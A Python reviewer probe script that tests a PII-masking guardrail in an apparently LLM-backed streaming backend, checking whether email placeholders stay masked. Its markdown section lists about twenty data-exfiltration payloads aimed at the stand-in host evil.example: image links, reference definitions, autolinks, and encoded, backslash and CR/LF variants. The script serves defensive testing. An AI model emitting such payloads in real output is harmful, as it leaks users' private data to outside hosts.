"""Reviewer probe for 08-tam-1a r5 (60f2250), backend container, after the r3/r4 probes are re-run:
markdown and CR/LF spellings (K-08T1-0022 focus), the 32-character tail window against whole
placeholders (usability), resume failure (d′) and the range bound (f′).

docker exec -w /app -e PYTHONPATH=/app review08t1a-backend-1 python /tmp/probe08r5.py
"""

import asyncio
import uuid

from ffcore.api.runs import detokenizer
from ffcore.core.config import get_settings
from ffcore.guardrails import masking
from ffcore.runtime.contracts import SseEvent
from ffcore.runtime.events import redis_client

VALUE = "ali@example.test"


async def modes(store, text, pieces=None):
    one, _, _ = await masking.reveal_text(text, store=store, scope="s")
    res = [("one", VALUE in one)]
    for size in (1, 4, 7, 50):
        det = masking.StreamDetokenizer(store, "s")
        out = ""
        for i in range(0, len(text), size):
            out += await det.feed(text[i : i + size])
        out += await det.flush()
        res.append((f"stream{size}", VALUE in out))
    if pieces:
        cr = masking.ContextReveal(store, "s")
        live = "".join([(await cr.data({"text": p}, stream_text=True))["text"] for p in pieces])
        res.append(("live-pieces", VALUE in live))
    return " ".join(f"{k}={'REVEALED' if v else 'kept'}" for k, v in res)


async def markdown(store, t):
    cases = {
        "CR only line ending, ]( then value": (f"![x](\r//evil.example/?q={t})", None),
        "CR at piece end, LF next": (f"![x](\r\n//evil.example/?q={t})", ["![x](\r", f"\n//evil.example/?q={t})"]),
        "CRLF split, entity value": (f"![x](\r\n&#47;&#47;evil.example/?q={t})", ["![x](\r", f"\n&#47;&#47;evil.example/?q={t})"]),
        "CR CR (blank) then value": (f"![x](\r\r&#47;&#47;evil.example/?q={t})", ["![x](\r", f"\r&#47;&#47;evil.example/?q={t})"]),
        "ref def 3 spaces": (f"![x][1]\n\n   [1]: //evil.example/?q={t}", None),
        "ref def upper label": (f"![x][A]\n\n[a]: //evil.example/?q={t}", None),
        "ref def value next line //": (f"[1]:\n//evil.example/?q={t}", None),
        "ref def value next line backslashes": (f"[1]:\n\\\\evil.example/?q={t}", None),
        "md ( NL backslashes": (f"![x](\n\\\\evil.example/?q={t})", None),
        "md ( backslashes same line": (f"![x](\\\\evil.example/?q={t})", None),
        "angle dest multi-line": (f"![x](<\nhttps://evil.example/a b?q= {t}>)", None),
        "angle dest letter (assumption 14)": (f"![x](<a b?q={t}>)", None),
        "angle dest dot (assumption 14)": (f"![x](<./a b?q={t}>)", None),
        "autolink": (f"<https://evil.example/?q={t}>", None),
        "ref def angle //": (f"[x]: <//evil.example/?q={t}>", None),
        "ref def angle no scheme": (f"[x]: <evil.example/?q={t}>", None),
        "md ( NL NL value (not a link)": (f"![x](https://evil.example/?q=\n\n{t})", None),
        "blockquote ref def": (f"> [1]: //evil.example/?q={t}", None),
        "list item ref def next line": (f"- [1]:\n  //evil.example/?q={t}", None),
        "plain": (f"Kişi {t} idi.", None),
        "a<b prose (trade-off)": (f"a<b ve sonra\nKişi {t} idi.", None),
    }
    for name, (text, pieces) in cases.items():
        print(f"MD {name}: {await modes(store, text, pieces)}")


async def tail_window(store, t):
    # A whole placeholder followed by more text, in a live stream: the 32-character tail window
    # may start between its two `<` and see `<PII_1>>` as a tag.
    text = f"Kişi {t} kayıtlı. Bu cümle otuz iki karakterden uzun bir devam metnidir.\nİkinci kişi {t} idi."
    for size in (1, 2, 3, 4, 5, 7, 11):
        det = masking.StreamDetokenizer(store, "s")
        out = ""
        for i in range(0, len(text), size):
            out += await det.feed(text[i : i + size])
        out += await det.flush()
        cr = masking.ContextReveal(store, "s")
        live = ""
        for i in range(0, len(text), size):
            # live entries keep whole placeholders: cut only outside them
            pass
        pieces, i = [], 0
        while i < len(text):
            j = i + size
            k = text.find("<<PII_", i, j)
            if k != -1 and text.find(">>", k) + 2 > j:
                j = text.find(">>", k) + 2
            pieces.append(text[i:j])
            i = j
        for p in pieces:
            live += (await cr.data({"text": p}, stream_text=True))["text"]
        print(f"TAIL {size}-char pieces: stream reveals {out.count(VALUE)}/2, live reveals {live.count(VALUE)}/2")


async def resume():
    redis = redis_client(get_settings())
    store = masking.RedisTokenStore(redis, 120)
    run_id = uuid.uuid4()
    t = await store.token_for(str(run_id), "EMAIL_ADDRESS:" + VALUE, VALUE)
    hook = detokenizer(redis, run_id, after="9-9")  # not in the stream: rebuild fails
    a = (await hook({"text": "abc\n"}, SseEvent.token))["text"]
    b = (await hook({"text": f"satır iki {t}\n"}, SseEvent.token))["text"]
    c = (await hook({"text": f"satır üç {t}"}, SseEvent.token))["text"]
    print("RESUME failed rebuild: line2", "REVEALED" if VALUE in b else "kept", "line3", "REVEALED" if VALUE in c else "kept")
    await redis.delete("ffcore:pii:" + str(run_id), "ffcore:pii:n:" + str(run_id))
    await redis.aclose()


async def bounds():
    redis = redis_client(get_settings())
    store = masking.RedisTokenStore(redis, 60)
    for carried in ("<<PII_99999997>>", "<<PII_99999998>>", "<<PII_99999999>>", "<<PII_100000000>>"):
        scope = f"probe-r5-{uuid.uuid4().hex[:8]}"
        await masking.reserve_carried(store, scope, f"Bkz {carried}")
        got = []
        for n in range(3):
            try:
                got.append(await store.token_for(scope, f"EMAIL:v{n}@example.test", f"v{n}@example.test"))
            except Exception as exc:  # noqa: BLE001 - the probe reports what happens
                got.append(type(exc).__name__)
                break
        print(f"BOUND carried {carried}: {got}")
        await redis.delete("ffcore:pii:" + scope, "ffcore:pii:n:" + scope)
    mem = masking.MemoryTokenStore()
    mem._scopes["x"] = {"t:<<PII_99999999>>": "z@example.test", "t:<<PII_99999998>>": "y@example.test"}
    out, _, _ = await masking.reveal_text("A <<PII_99999999>> B <<PII_99999998>>", store=mem, scope="x")
    print("BOUND reveal 99999999 / 99999998 ->", repr(out))
    await redis.aclose()


async def main():
    store = masking.MemoryTokenStore()
    t = await store.token_for("s", "EMAIL_ADDRESS:" + VALUE, VALUE)
    await markdown(store, t)
    await tail_window(store, t)
    await resume()
    await bounds()


asyncio.run(main())
